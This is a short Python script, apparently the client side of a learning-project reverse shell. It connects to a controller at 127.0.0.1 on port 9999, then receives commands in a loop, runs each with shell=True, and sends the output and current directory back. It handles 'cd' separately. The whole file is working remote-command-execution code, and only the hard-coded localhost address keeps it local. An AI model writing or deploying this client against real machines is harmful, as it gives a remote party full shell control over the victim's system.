import os
import socket
import subprocess


s = socket.socket()
host = "127.0.0.1"
port = 9999
s.connect((host, port))


while True:
    data = s.recv(1024) # recive data from the server (commnads)
    if data[:2].decode("utf-8") == "cd": # if the commnad is cd we'll do this, access to the os and change directory
        os.chdir(data[3:].decode("utf-8"))# the directory name is from the 3r letter
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()# pillamos el resulatado por consola (son bytes)
        output_str = str(output_bytes, "utf-8")
        #output_str = output_bytes.decode("utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + ">"))
        print(output_str)


s.close()